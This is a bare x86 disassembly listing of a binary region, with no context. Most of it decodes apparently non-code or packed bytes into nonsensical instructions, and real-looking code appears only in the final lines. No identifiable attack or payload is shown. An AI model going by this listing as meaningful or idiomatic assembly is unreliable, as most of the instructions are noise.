  40310f:	jmp    0xd09e50a4
  403114:	je     0x403173
  403116:	push   0x74
  403118:	and    eax,0x4c3f0f29
  40311d:	out    dx,eax
  40311e:	mov    DWORD PTR [eax+edi*2+0x7c62e681],esp
  403125:	mov    edi,0x9ab268f3
  40312a:	repz push cs
  40312c:	xchg   edi,eax
  40312d:	jmp    0x91a697bd
  403132:	nop
  403133:	enter  0x41c9,0xd4
  403137:	cmp    edx,DWORD PTR ds:0xca41ede7
  40313d:	pushf  
  40313e:	ins    BYTE PTR es:[di],dx
  403140:	shl    DWORD PTR ds:0x92b67f35,1
  403146:	jge    0x403131
  403148:	mov    al,ds:0x12da8054
  40314d:	clc    
  40314e:	pop    ds
  40314f:	pop    si
  403151:	sti    
  403152:	shl    BYTE PTR [ecx-0x2],0xb6
  403156:	rol    BYTE PTR [ebx],cl
  403158:	and    al,0xb1
  40315a:	mov    ?,esi
  40315c:	add    al,dh
  40315e:	sbb    DWORD PTR [edi],edi
  403160:	arpl   ax,si
  403162:	push   ebp
  403163:	(bad)  [esi+edi*2+0x7a]
  403167:	cdq    
  403168:	xchg   al,ah
  40316a:	inc    eax
  40316b:	jle    0x403132
  40316d:	add    eax,0xb270b442
  403172:	nop
  403173:	test   eax,0x8f969086
  403178:	fsubr  DWORD PTR [edi+0x5cfc1742]
  40317e:	sbb    BYTE PTR [ebx+0x2],bl
  403181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403182:	or     eax,0xb38f2034
  403187:	cmp    BYTE PTR [eax],dh
  403189:	ds nop
  40318b:	inc    esp
  40318c:	jno    0x403148
  40318e:	push   eax
  40318f:	dec    ecx
  403190:	(bad)  
  403192:	jl     0x403153
  403194:	mov    al,ds:0x169fe5c0
  403199:	shl    DWORD PTR [edi+0x13c6eb02],0xed
  4031a0:	add    eax,DWORD PTR [eax]
  4031a2:	xchg   BYTE PTR [ebp+0xcb4c27f],cl
  4031a8:	lock jne 0x403160
  4031ab:	cmp    BYTE PTR [esp+ebx*2],al
  4031ae:	inc    edi
  4031af:	cli    
  4031b0:	xchg   edi,eax
  4031b1:	lahf   
  4031b2:	imul   edi,DWORD PTR [edi],0xcaec0153
  4031b8:	loopne 0x40322f
  4031ba:	hlt    
  4031bb:	jg     0x403143
  4031bd:	call   0xecf7:0xa6573bb7
  4031c4:	push   cs
  4031c5:	(bad)  [eax]
  4031c7:	int    0x36
  4031c9:	cwde   
  4031ca:	iret   
  4031cb:	xchg   esp,eax
  4031cc:	loop   0x4031cb
  4031ce:	push   ebx
  4031cf:	aaa    
  4031d0:	pop    ss
  4031d1:	addr16 cmp al,0x86
  4031d4:	data16 fisub DWORD PTR [ebx]
  4031d7:	and    ebx,DWORD PTR [ecx-0x3c19b752]
  4031dd:	mov    ch,0x63
  4031df:	clc    
  4031e0:	leave  
  4031e1:	mov    ecx,0x89a38e
  4031e6:	scas   al,BYTE PTR es:[edi]
  4031e7:	mov    DWORD PTR ds:0xd14bc8c4,edx
  4031ed:	or     DWORD PTR [ebx+0x2a5497de],0x49
  4031f4:	mov    ds:0x11efb432,eax
  4031f9:	or     BYTE PTR [edx+0x6c9f9a2b],dh
  4031ff:	mov    dl,0xb
  403201:	jg     0x40323d
  403203:	mov    ds:0xffef5fec,eax
  403208:	pop    ss
  403209:	and    eax,0xce830305
  40320e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40320f:	cmp    al,0xe5
  403211:	add    eax,0xb203c18b
  403216:	xchg   ecx,eax
  403217:	or     al,0xbb
  403219:	mul    DWORD PTR [ebx]
  40321b:	xchg   edi,eax
  40321c:	sahf   
  40321d:	push   es
  40321e:	sub    al,0xd3
  403220:	movzx  ebp,WORD PTR [eax-0x57596112]
  403227:	ins    DWORD PTR es:[edi],dx
  403228:	cmp    DWORD PTR [esi+ebp*2+0x155f761c],esp
  40322f:	leave  
  403230:	mov    cs,WORD PTR [ebp-0xb4c407b]
  403236:	jno    0x403267
  403238:	js     0x4032b9
  40323a:	cmp    eax,0xda19f32c
  40323f:	adc    ah,bl
  403241:	mov    cl,0x59
  403243:	jo     0x40329d
  403245:	dec    ebp
  403246:	dec    edx
  403247:	call   0x1c1b213f
  40324c:	jge    0x4032c9
  40324e:	call   0x1cd4f7fa
  403253:	iret   
  403254:	stos   DWORD PTR es:[edi],eax
  403255:	xchg   DWORD PTR [ebx+0x6fc59c34],edx
  40325b:	outs   dx,DWORD PTR ds:[esi]
  40325c:	mov    ds:0xdec11bed,al
  403261:	pop    ebp
  403262:	xor    BYTE PTR [edi-0x4f],bh
  403265:	pop    ecx
  403266:	imul   esp,edi,0xb9cd5c5e
  40326c:	ja     0x4032e8
  40326e:	push   ss
  40326f:	adc    DWORD PTR [edx],ebx
  403271:	dec    ecx
  403272:	popa   
  403273:	push   esp
  403274:	jecxz  0x4032ca
  403276:	inc    esi
  403277:	in     eax,dx
  403278:	add    eax,DWORD PTR [eax+0x6b]
  40327b:	fsubr  QWORD PTR [eax]
  40327d:	and    al,0x35
  40327f:	call   0xfa32:0xda8813a1
  403286:	stos   BYTE PTR es:[edi],al
  403287:	pop    edx
  403288:	sahf   
  403289:	mov    al,ds:0x84ba29af
  40328e:	and    BYTE PTR [ecx+0x4455b484],ch
  403294:	mov    esi,0x3fb668e6
  403299:	adc    BYTE PTR [ebx+0x1b],0xd8
  40329d:	add    bl,BYTE PTR [ebx]
  40329f:	dec    ecx
  4032a0:	dec    ecx
  4032a1:	imul   esi,DWORD PTR [esp+edx*2+0x5f83c0e4],0xbadb3b75
  4032ac:	adc    BYTE PTR [ecx-0x255f7a16],bh
  4032b2:	das    
  4032b3:	rcl    eax,0xfc
  4032b6:	test   al,0x2b
  4032b8:	in     al,dx
  4032b9:	dec    ebp
  4032ba:	call   0x6ce1842f
  4032bf:	push   esp
  4032c0:	mov    al,0x99
  4032c2:	lods   al,BYTE PTR ds:[esi]
  4032c3:	cmp    eax,0xde5e9836
  4032c8:	in     al,dx
  4032c9:	out    0xd9,al
  4032cb:	mov    ds:0xf2241802,al
  4032d0:	inc    edi
  4032d1:	sbb    al,BYTE PTR [ebx-0x4f]
  4032d4:	adc    al,0xf0
  4032d6:	mov    esi,0xa3ff235e
  4032db:	mov    al,BYTE PTR [ecx-0x47d77124]
  4032e1:	jns    0x40327f
  4032e3:	add    eax,0x7b0666e1
  4032e8:	adc    BYTE PTR [ecx+ecx*1],ah
  4032eb:	inc    ebx
  4032ec:	jmp    0xe359:0x56739fe
  4032f3:	jle    0x4032f3
  4032f5:	pop    ebp
  4032f6:	mov    esp,0x893dcf6b
  4032fb:	or     eax,0x9e9de63b
  403300:	pushf  
  403301:	repz cmp al,0xa7
  403304:	inc    ebx
  403305:	imul   DWORD PTR [ecx+0xeea4201]
  40330b:	add    eax,0x8ab45715
  403310:	dec    ebx
  403311:	dec    esi
  403312:	popa   
  403313:	ins    DWORD PTR es:[edi],dx
  403314:	int3   
  403315:	xor    BYTE PTR [esp+edi*8-0x1a2c07f2],cl
  40331c:	lods   al,BYTE PTR ds:[esi]
  40331d:	(bad)  
  40331e:	popf   
  40331f:	bound  esp,QWORD PTR ds:0x8921ea7f
  403325:	jns    0x4032a9
  403327:	ret    0xb73b
  40332a:	lock pop es
  40332c:	leave  
  40332d:	dec    eax
  40332e:	mov    ecx,0xe527c61a
  403333:	shl    DWORD PTR [ebp-0x65],0x3
  403337:	sbb    al,0x1a
  403339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40333a:	push   edx
  40333b:	adc    DWORD PTR [ebp+0xa],ecx
  40333e:	cmp    ebx,edx
  403340:	out    0xfd,al
  403342:	jmp    0x403344
  403344:	les    eax,FWORD PTR ds:0xb356ae91
  40334a:	ret    0x3fbe
  40334d:	(bad)  
  40334e:	mov    dl,0x25
  403350:	inc    ebx
  403351:	ss push cs
  403353:	aam    0x6c
  403355:	or     ebx,DWORD PTR [ecx+eiz*4-0x7c]
  403359:	sub    dh,BYTE PTR [ebx-0x439ce5d4]
  40335f:	sub    eax,0x8dfae2e5
  403364:	or     edx,DWORD PTR [ebx]
  403366:	mov    edx,0x709e0c7f
  40336b:	adc    DWORD PTR [eax-0x2ea6cac0],0xffffffef
  403372:	cwde   
  403373:	test   al,0x54
  403375:	sub    BYTE PTR [esi-0x36d57b69],bl
  40337b:	out    0x95,eax
  40337d:	xor    dl,BYTE PTR [ebp+0x3bb4d310]
  403383:	push   ecx
  403384:	jle    0x4033d7
  403386:	call   0x64f0617
  40338b:	fld    QWORD PTR [edx+0x200aefb5]
  403391:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403392:	gs stos DWORD PTR es:[edi],eax
  403394:	cmp    bh,BYTE PTR [eax+eiz*1+0x1e]
  403398:	ja     0x4033a1
  40339a:	aaa    
  40339b:	test   BYTE PTR [esp+ebp*4-0x11],al
  40339f:	pop    ecx
  4033a0:	sbb    dh,cl
  4033a2:	sahf   
  4033a3:	ja     0x40339f
  4033a5:	pushf  
  4033a6:	mov    cl,BYTE PTR [ebx]
  4033a8:	cli    
  4033a9:	add    DWORD PTR [esi],ebp
  4033ab:	scas   eax,DWORD PTR es:[edi]
  4033ac:	fs sub BYTE PTR ds:[edi],bl
  4033b0:	fld    QWORD PTR [ecx-0x516d526f]
  4033b6:	dec    eax
  4033b7:	pushf  
  4033b8:	add    BYTE PTR [ebx],bl
  4033ba:	adc    eax,0x4aa81cf9
  4033bf:	sub    BYTE PTR [edx-0x178b5829],ah
  4033c5:	lahf   
  4033c6:	dec    esi
  4033c7:	and    DWORD PTR [ebx+eiz*8+0x16556d90],esp
  4033ce:	inc    edi
  4033cf:	test   DWORD PTR [esi+0x154204d5],esi
  4033d5:	jae    0x4033d7
  4033d7:	popa   
  4033d8:	cmp    dh,BYTE PTR [edi-0xba3a488]
  4033de:	and    eax,0x903fab78
  4033e3:	ret    
  4033e4:	fdivr  st,st(4)
  4033e6:	add    al,0xb
  4033e8:	(bad)  
  4033e9:	push   esi
  4033ea:	xchg   edi,eax
  4033eb:	cmp    eax,0xff3f8fe
  4033f0:	sbb    eax,0x5cb885aa
  4033f5:	fisubr WORD PTR [esp+ecx*8+0x7feb7944]
  4033fc:	xlat   BYTE PTR ds:[ebx]
  4033fd:	inc    eax
  4033fe:	stos   DWORD PTR es:[edi],eax
  4033ff:	xor    al,0xb0
  403401:	dec    edi
  403402:	push   0x2e
  403404:	ins    DWORD PTR es:[edi],dx
  403405:	push   edx
  403406:	pusha  
  403407:	add    ebp,DWORD PTR [eax+0x2b4610c]
  40340d:	jns    0x40345c
  40340f:	mov    ecx,0x73c06b12
  403414:	(bad)  
  403415:	adc    DWORD PTR [eax+esi*8-0x5d],ebx
  403419:	or     DWORD PTR [ebx-0x3811ccca],0x1b
  403420:	nop
  403421:	pop    esi
  403422:	daa    
  403423:	retf   0x19bd
  403426:	push   es
  403427:	pop    ebx
  403428:	pop    edx
  403429:	js     0x4033bb
  40342b:	pop    edi
  40342c:	push   edx
  40342d:	clc    
  40342e:	adc    ecx,ebx
  403430:	and    DWORD PTR [eax],edi
  403432:	rcr    BYTE PTR [edx+edi*2-0x1d463414],cl
  403439:	mov    esi,0x298d5f72
  40343e:	pop    edx
  40343f:	pop    ebx
  403440:	xchg   ebp,eax
  403441:	add    BYTE PTR [ebx+ebx*4+0x46bc9488],0xa1
  403449:	dec    esi
  40344a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40344b:	out    dx,eax
  40344c:	mov    eax,ds:0xb55cb6f3
  403451:	mov    esp,0xb55a8ff1
  403456:	mov    al,BYTE PTR [eax-0x3d]
  403459:	cmp    ebx,DWORD PTR [esp+eiz*2]
  40345c:	jo     0x4034d1
  40345e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40345f:	push   edx
  403460:	sub    BYTE PTR [esi+0x37],ah
  403463:	mov    cs,edi
  403465:	and    BYTE PTR [edx],ch
  403467:	jno    0x40349d
  403469:	nop
  40346a:	sbb    esp,esp
  40346c:	lea    edx,[ebx-0x2c420d37]
  403472:	mov    WORD PTR ds:0x41af0c03,cs
  403478:	fcomp  QWORD PTR [esi]
  40347a:	mov    eax,0x15c81ee7
  40347f:	fcomip st,st(0)
  403481:	or     DWORD PTR [ecx+edi*1-0x1c],edi
  403485:	lods   eax,DWORD PTR ds:[esi]
  403486:	xor    al,0x21
  403488:	out    dx,al
  403489:	xchg   ecx,eax
  40348a:	(bad)  
  40348b:	in     eax,dx
  40348c:	sahf   
  40348d:	jns    0x4034a5
  40348f:	mov    bh,0x30
  403491:	xchg   ebx,eax
  403492:	inc    ecx
  403493:	xchg   esi,eax
  403494:	jae    0x403440
  403496:	jbe    0x4034b0
  403498:	gs pop esp
  40349a:	mov    ds:0x64c1da64,al
  40349f:	lea    eax,[esi+0x1616bfd8]
  4034a5:	outs   dx,DWORD PTR ds:[esi]
  4034a6:	ins    DWORD PTR es:[edi],dx
  4034a7:	mov    ds:0xf38b40eb,eax
  4034ac:	mov    ebp,0x4f80f27e
  4034b1:	retf   0xfdcc
  4034b4:	xchg   BYTE PTR [esi+edx*8],bh
  4034b7:	push   cs
  4034b8:	sbb    eax,0xf14f0da4
  4034bd:	fcmovnu st,st(5)
  4034bf:	jl     0x4034f4
  4034c1:	inc    esi
  4034c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034c3:	jnp    0x403480
  4034c5:	dec    ecx
  4034c6:	rcr    BYTE PTR [eax-0x6d],0x67
  4034ca:	mov    al,0xce
  4034cc:	arpl   WORD PTR [edx+0xc],si
  4034cf:	push   edx
  4034d0:	in     al,dx
  4034d1:	mov    ds:0x27b8dd0f,al
  4034d6:	push   ecx
  4034d7:	and    BYTE PTR [esi+0x29d89cba],ch
  4034dd:	pop    ebx
  4034de:	test   cl,ah
  4034e0:	clc    
  4034e1:	mov    ecx,0xd61b3dd
  4034e6:	jg     0x4034bc
  4034e8:	or     bl,BYTE PTR [eax+edx*4]
  4034eb:	and    eax,0x294a818e
  4034f0:	sub    DWORD PTR [ecx+0x5eb1cad3],edx
  4034f6:	push   ebx
  4034f7:	xchg   edx,eax
  4034f8:	das    
  4034f9:	lock mov al,ds:0x8703d1bc
  4034ff:	mov    ds:0x440ac931,eax
  403504:	inc    eax
  403505:	mov    BYTE PTR [esi+edx*4+0x63],bh
  403509:	xchg   esi,eax
  40350a:	jmp    0x403509
  40350c:	jnp    0x403564
  40350e:	mov    al,ds:0xd07b9498
  403513:	fnstcw WORD PTR [ebp-0xe286508]
  403519:	cwde   
  40351a:	inc    esi
  40351b:	fsubr  st,st(7)
  40351d:	jb     0x4034fa
  40351f:	cmp    al,0x57
  403521:	adc    BYTE PTR [edi],0xd2
  403524:	cmp    eax,0x763b2d5c
  403529:	imul   edi,DWORD PTR [ecx],0xcf148784
  40352f:	mov    BYTE PTR [edi+0x78e8b4e6],bh
  403535:	dec    ecx
  403536:	or     eax,0xc229731b
  40353b:	ror    BYTE PTR [eax],cl
  40353d:	push   eax
  40353e:	jbe    0x4035b0
  403540:	idiv   BYTE PTR [edx+ebx*4+0x75]
  403544:	jns    0x4035a0
  403546:	cwde   
  403547:	pop    ss
  403548:	ret    0xf76d
  40354b:	mov    bh,0xac
  40354d:	(bad)  
  40354e:	out    0xd0,eax
  403550:	mov    bh,0x2e
  403552:	imul   esi,DWORD PTR [edx-0x1423fdcc],0x70bc8f2d
  40355c:	mov    dh,0x5d
  40355e:	inc    ebp
  40355f:	cli    
  403560:	push   edi
  403561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403562:	xchg   esp,eax
  403563:	jecxz  0x4034fb
  403565:	in     eax,0x56
  403567:	xor    edi,eax
  403569:	ss gs push ss
  40356c:	repz xor DWORD PTR [edx+ebx*8+0x34389a92],esp
  403574:	mov    ds:0x4b39c461,al
  403579:	repnz push 0x20
  40357c:	jmp    0x7104:0x8adc131b
  403583:	mov    ds:0xf80f8d87,al
  403588:	inc    ebx
  403589:	mov    ah,0x55
  40358b:	hlt    
  40358c:	dec    eax
  40358d:	inc    esp
  40358e:	mov    eax,0xfb4b7ec9
  403593:	rcl    ah,0x4f
  403596:	(bad)  [ebx]
  403598:	in     al,dx
  403599:	arpl   WORD PTR [ebx+0x673a4f96],dx
  40359f:	xchg   ebx,eax
  4035a0:	retf   0xd15e
  4035a3:	jl     0x40356d
  4035a5:	lods   eax,DWORD PTR ds:[esi]
  4035a6:	stc    
  4035a7:	enter  0xc65d,0x5e
  4035ab:	and    edi,edi
  4035ad:	fild   DWORD PTR [edx+0x60e1112b]
  4035b3:	lods   al,BYTE PTR ds:[esi]
  4035b4:	stc    
  4035b5:	mov    bh,0x6b
  4035b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035b8:	mov    dh,BYTE PTR [ebx+0xbf1f9fa]
  4035be:	xlat   BYTE PTR ds:[ebx]
  4035bf:	fcomp  st(7)
  4035c1:	mov    eax,ecx
  4035c3:	test   esp,edi
  4035c5:	jg     0x403621
  4035c7:	xor    eax,0x7b15fd22
  4035cc:	lds    edx,FWORD PTR [ebp-0x35]
  4035cf:	out    0xe8,eax
  4035d1:	push   0x2c5934ee
  4035d6:	sbb    ebp,DWORD PTR [esi-0x59702f1a]
  4035dc:	fcmovnb st,st(7)
  4035de:	sbb    DWORD PTR [eax],edx
  4035e0:	lock mov BYTE PTR [esi-0x20b8dee0],dh
  4035e7:	xor    eax,0x92b92c1c
  4035ec:	xlat   BYTE PTR ds:[ebx]
  4035ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035ee:	psraw  mm3,QWORD PTR [edi+0x7498017]
  4035f5:	cmp    DWORD PTR [esp+eiz*4+0x14a7c3e2],ecx
  4035fc:	test   BYTE PTR [edi-0x71cc7181],0x5
  403603:	cmp    al,0x1
  403605:	out    0x3c,al
  403607:	add    al,0x29
  403609:	push   esp
  40360a:	adc    BYTE PTR [ecx],dh
  40360c:	jmp    0x5fff:0x503ecc61
  403613:	add    DWORD PTR [esi-0x26dc57d2],0xe9746ee9
  40361d:	test   DWORD PTR [esi+ebp*1+0x35],esi
  403621:	cmp    BYTE PTR [ebp-0x58e9b995],al
  403627:	inc    edi
  403628:	push   ds
  403629:	icebp  
  40362a:	mov    ebp,0x1a961f78
  40362f:	mov    eax,ds:0x236f54b5
  403634:	call   0xf87e40ad
  403639:	and    eax,0x4271ffbb
  40363e:	je     0x403607
  403640:	jne    0x4035f1
  403642:	and    eax,0x60941b41
  403647:	lods   eax,DWORD PTR ds:[esi]
  403648:	mov    ebx,0x9db6574d
  40364d:	push   cs
  40364e:	in     eax,dx
  40364f:	jmp    0x7edaf1be
  403654:	jnp    0x4035f5
  403656:	fidivr DWORD PTR [ecx+esi*1]
  403659:	inc    edx
  40365a:	dec    esi
  40365b:	loope  0x403631
  40365d:	mov    ah,0xcb
  40365f:	in     eax,0x65
  403661:	push   eax
  403662:	mov    edx,0xa78b26fd
  403667:	inc    edi
  403668:	push   ecx
  403669:	dec    esp
  40366a:	or     ebx,DWORD PTR [ebx]
  40366c:	test   al,0x2e
  40366e:	jg     0x40366d
  403670:	loope  0x403683
  403672:	dec    edi
  403673:	lods   eax,DWORD PTR ds:[esi]
  403674:	push   esi
  403675:	push   ebx
  403676:	(bad)  
  403677:	es jbe 0x40369c
  40367a:	inc    ebp
  40367b:	int    0xcc
  40367d:	jbe    0x4035ff
  40367f:	sub    ebp,ecx
  403681:	test   DWORD PTR [edi+edi*8-0x14cb59a2],0xdec40ff0
  40368c:	pop    ecx
  40368d:	and    al,0x64
  40368f:	adc    dl,dh
  403691:	cmp    bl,cl
  403693:	outs   dx,BYTE PTR ds:[esi]
  403694:	pusha  
  403695:	pop    es
  403696:	and    al,0x3
  403698:	cmc    
  403699:	icebp  
  40369a:	dec    esp
  40369b:	cmp    DWORD PTR [esi+0x4c0161b6],0xfffffff0
  4036a2:	data16 mov bl,bl
  4036a5:	push   eax
  4036a6:	jne    0x403679
  4036a8:	test   al,0x6c
  4036aa:	std    
  4036ab:	inc    edi
  4036ac:	xchg   DWORD PTR [eax+0x457b0422],edi
  4036b2:	sbb    al,BYTE PTR [edx]
  4036b4:	fnstcw WORD PTR [edi+0x28d165c8]
  4036ba:	fdiv   QWORD PTR [esi+0x1e641ee8]
  4036c0:	ret    
  4036c1:	inc    edi
  4036c2:	rcl    DWORD PTR [edx],0xd2
  4036c5:	pop    esp
  4036c6:	push   edx
  4036c7:	icebp  
  4036c8:	xor    DWORD PTR [edx+0x254044b9],ebx
  4036ce:	and    bh,0x4e
  4036d1:	out    dx,al
  4036d2:	(bad)  
  4036d5:	int3   
  4036d6:	push   ds
  4036d7:	cmp    BYTE PTR [esi+0x36],cl
  4036da:	mov    ebx,0xfadab36d
  4036df:	inc    esp
  4036e0:	and    al,BYTE PTR [edi-0x189cbc67]
  4036e6:	test   ah,cl
  4036e8:	(bad)  
  4036e9:	in     eax,dx
  4036ea:	xor    edi,DWORD PTR [ebp-0x6c]
  4036ed:	xor    edx,eax
  4036ef:	icebp  
  4036f0:	xchg   edi,eax
  4036f1:	inc    edi
  4036f2:	out    0xb3,al
  4036f4:	dec    esp
  4036f5:	mov    al,0x3b
  4036f7:	dec    edi
  4036f8:	push   0xfffffffc
  4036fa:	repnz shr DWORD PTR [ecx+ecx*8+0x4da94a66],1
  403702:	push   0x1f064140
  403707:	ins    BYTE PTR es:[edi],dx
  403708:	adc    BYTE PTR [edx+0x4a4ddbd0],dh
  40370e:	das    
  40370f:	gs adc DWORD PTR ss:[ebx],0x9
  403714:	(bad)  
  403715:	xchg   esi,eax
  403716:	std    
  403717:	lds    eax,FWORD PTR [ebp-0xa22fc42]
  40371d:	iret   
  40371e:	push   esp
  40371f:	jecxz  0x40375b
  403721:	sti    
  403722:	add    ah,ch
  403724:	lea    ecx,[ecx-0x198fd730]
  40372a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40372b:	bound  eax,QWORD PTR [eax]
  40372d:	cmp    al,0x96
  40372f:	ror    BYTE PTR [ebx],cl
  403731:	mov    ah,0x8c
  403733:	dec    eax
  403734:	mov    ebx,0xc05c0ec9
  403739:	dec    eax
  40373a:	jg     0x403753
  40373c:	stos   BYTE PTR es:[edi],al
  40373d:	sar    BYTE PTR ds:0x15e0c3a,1
  403743:	pop    ss
  403744:	mov    edx,0xcfba7f54
  403749:	mov    ah,0x1c
  40374b:	xor    cl,BYTE PTR [ecx+0x65f4d054]
  403751:	icebp  
  403752:	mov    ds:0xcc584b8a,eax
  403757:	jno    0x4036d9
  403759:	pop    ebp
  40375a:	xchg   ebx,eax
  40375b:	mov    ch,0xd1
  40375d:	scas   al,BYTE PTR es:[edi]
  40375e:	in     al,0x15
  403760:	aaa    
  403761:	add    ch,BYTE PTR ds:0x89981b0e
  403767:	std    
  403768:	mov    al,0x75
  40376a:	pop    edi
  40376b:	in     al,0x9a
  40376d:	dec    BYTE PTR [eax+ebp*1-0x216696fa]
  403774:	lods   al,BYTE PTR ds:[esi]
  403775:	inc    bh
  403777:	popa   
  403778:	mov    ch,0x67
  40377a:	xchg   DWORD PTR [ecx],ebx
  40377c:	cld    
  40377d:	and    eax,0x6852b7b3
  403782:	and    DWORD PTR [eax+0x5b97e252],esp
  403788:	cld    
  403789:	push   esp
  40378a:	leave  
  40378b:	and    esp,esp
  40378d:	mov    ch,0xe6
  40378f:	test   eax,0x233aed7a
  403794:	dec    esp
  403795:	imul   eax,DWORD PTR [edi-0x53],0xffffffb8
  403799:	pop    esi
  40379a:	sysexit 
  40379c:	jo     0x40377e
  40379e:	dec    edi
  40379f:	nop
  4037a0:	dec    esp
  4037a1:	enter  0xe70f,0x7e
  4037a5:	stos   DWORD PTR es:[edi],eax
  4037a6:	push   ebx
  4037a7:	pop    ebp
  4037a8:	push   ebp
  4037a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037aa:	scas   eax,DWORD PTR es:[edi]
  4037ab:	push   edx
  4037ac:	cld    
  4037ad:	push   es
  4037ae:	in     al,0xcd
  4037b0:	cmp    BYTE PTR [ecx+0xa],0xe7
  4037b4:	mov    ds:0x57b66fb0,al
  4037b9:	icebp  
  4037ba:	cmp    dl,BYTE PTR [edi+eiz*1-0x53]
  4037be:	push   cs
  4037bf:	out    0x49,eax
  4037c1:	jno    0x403835
  4037c3:	xor    ch,BYTE PTR [edi]
  4037c5:	pop    eax
  4037c6:	out    0xa4,al
  4037c8:	add    al,0xe
  4037ca:	inc    ebx
  4037cb:	pop    edx
  4037cc:	xchg   ecx,eax
  4037cd:	in     al,dx
  4037ce:	sbb    ebx,ebx
  4037d0:	lahf   
  4037d1:	jnp    0x403766
  4037d3:	and    BYTE PTR [eax],ah
  4037d5:	ss iret 
  4037d7:	push   ebp
  4037d8:	std    
  4037d9:	dec    edi
  4037da:	repnz xor ebp,DWORD PTR [eax]
  4037dd:	stos   DWORD PTR es:[edi],eax
  4037de:	xchg   esi,eax
  4037df:	sub    BYTE PTR [eax+0x5a18eace],0xa7
  4037e6:	sub    BYTE PTR [eax],ah
  4037e8:	clc    
  4037e9:	inc    ebp
  4037ea:	mov    ch,0xd1
  4037ec:	xchg   DWORD PTR ds:0xef6a99a8,eax
  4037f2:	out    0xbf,eax
  4037f4:	pop    edx
  4037f5:	jmp    0xbedcc107
  4037fa:	cmp    al,0x8b
  4037fc:	add    ah,dl
  4037fe:	cmp    DWORD PTR [eax],ebx
  403800:	mov    esi,0x6247560d
  403805:	imul   esp,DWORD PTR [edi+ebx*4],0x30ca9ad9
  40380c:	fmul   QWORD PTR [edi]
  40380e:	fsub   DWORD PTR [edx+0x10]
  403811:	inc    ecx
  403812:	es popf 
  403814:	hlt    
  403815:	mov    al,0x1
  403817:	push   ecx
  403818:	repz jbe 0x403805
  40381b:	mov    ebp,0xf4e17581
  403820:	(bad)  
  403821:	jno    0x4037ff
  403823:	mov    ch,0x34
  403825:	mov    edx,ebx
  403827:	pop    ss
  403828:	popf   
  403829:	jg     0x403884
  40382b:	fistp  DWORD PTR [ecx+esi*1+0x13]
  40382f:	clc    
  403830:	outs   dx,BYTE PTR ds:[esi]
  403831:	push   esi
  403832:	aad    0x34
  403834:	mov    dl,0x8e
  403836:	js     0x4037fa
  403838:	add    esi,DWORD PTR [ebx+esi*2+0x7c71215]
  40383f:	mov    ds,WORD PTR [ebp+ecx*1-0x37]
  403843:	mov    ch,0x82
  403845:	shr    DWORD PTR [ebx+0x47],cl
  403848:	jmp    0x403879
  40384a:	dec    ebx
  40384b:	adc    al,0xac
  40384d:	xchg   esi,eax
  40384e:	ss pop esp
  403850:	mov    edx,DWORD PTR [ecx+0x12e0bbb5]
  403856:	test   DWORD PTR es:[edx+0x11],eax
  40385a:	rol    DWORD PTR [esi],1
  40385c:	inc    edx
  40385d:	jecxz  0x4038ad
  40385f:	pop    ebp
  403860:	mov    ebp,0x314abac4
  403865:	pop    esi
  403866:	jns    0x40386d
  403868:	xor    eax,0xac40d81b
  40386d:	and    bh,bh
  40386f:	mov    al,ds:0xeb496036
  403874:	ins    BYTE PTR es:[edi],dx
  403875:	cwde   
  403876:	popa   
  403877:	mov    ebp,0x458e3fb6
  40387c:	outs   dx,BYTE PTR ds:[esi]
  40387d:	mov    ds:0xe40d4c3,eax
  403882:	ret    
  403883:	sub    ebx,DWORD PTR [eax-0x4e]
  403886:	jne    0x403891
  403888:	iret   
  403889:	jmp    0x3516496a
  40388e:	stc    
  40388f:	adc    BYTE PTR [ecx+0x33],bh
  403892:	add    esi,DWORD PTR [esi-0x2bcf4b23]
  403898:	inc    esi
  403899:	mov    DWORD PTR [esp+eax*8-0x16],esi
  40389d:	cmp    al,0xa4
  40389f:	addr16 test al,0xb9
  4038a2:	and    eax,0xd7147372
  4038a7:	imul   ebx,DWORD PTR [ecx],0xffffffbb
  4038aa:	xor    eax,0xe5349bb3
  4038af:	jle    0x40392f
  4038b1:	push   es
  4038b2:	pop    ss
  4038b3:	add    ecx,DWORD PTR ds:0x6bdaeb4e
  4038b9:	push   cs
  4038ba:	xchg   edx,eax
  4038bb:	inc    esi
  4038bc:	jmp    0x4038e5
  4038be:	or     BYTE PTR [ecx-0x24],ah
  4038c1:	retf   0x9b4b
  4038c4:	mov    eax,0xdd4f2aa9
  4038c9:	or     BYTE PTR [ebp+eiz*4-0x60],0x13
  4038ce:	retf   0x8a79
  4038d1:	sub    ch,BYTE PTR [edx-0x12]
  4038d4:	pop    esp
  4038d5:	shl    esi,1
  4038d7:	push   bx
  4038d9:	mov    ebx,0x77eab17b
  4038de:	pop    ebp
  4038df:	pop    esp
  4038e0:	fistp  DWORD PTR [eax+eiz*2]
  4038e3:	xlat   BYTE PTR ds:[ebx]
  4038e4:	add    DWORD PTR [edi-0x7a41c461],eax
  4038ea:	pop    ecx
  4038eb:	repz jne 0x403920
  4038ee:	xchg   DWORD PTR [esi+0xd],esp
  4038f1:	test   esi,0x8585a0e1
  4038f7:	xchg   ebp,eax
  4038f8:	mov    bl,0xe8
  4038fa:	mov    esp,edi
  4038fc:	shl    BYTE PTR [ebp+0x318c889],1
  403902:	dec    ecx
  403903:	mov    ecx,DWORD PTR [ebp-0x10]
  403906:	sub    DWORD PTR ds:0x426eb9,0x426ea1
  403910:	xor    eax,esi
  403912:	adc    DWORD PTR ds:0x426f2d,0x426f05
  40391c:	xor    ecx,esi
  40391e:	sub    eax,ecx
  403920:	mov    DWORD PTR ds:0x426f15,0x36a1
  40392a:	cmp    edx,eax
  40392c:	jne    0x403b2f
  403932:	mov    eax,DWORD PTR [ebp-0xc]
  403935:	and    DWORD PTR ds:0x426ee1,0x0
  40393f:	jmp    0x403951
  403944:	mov    ecx,DWORD PTR ds:0x426ee1
  40394a:	inc    ecx
